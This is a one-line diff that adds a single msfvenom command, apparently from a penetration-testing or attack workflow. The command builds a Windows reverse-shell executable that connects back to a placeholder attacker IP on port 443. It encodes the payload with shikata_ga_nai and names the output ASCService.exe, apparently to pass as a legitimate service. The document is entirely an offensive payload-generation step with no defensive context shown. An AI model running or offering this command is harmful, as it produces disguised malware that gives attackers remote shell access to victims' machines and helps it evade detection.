@@ -1,0 +1,1 @@
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
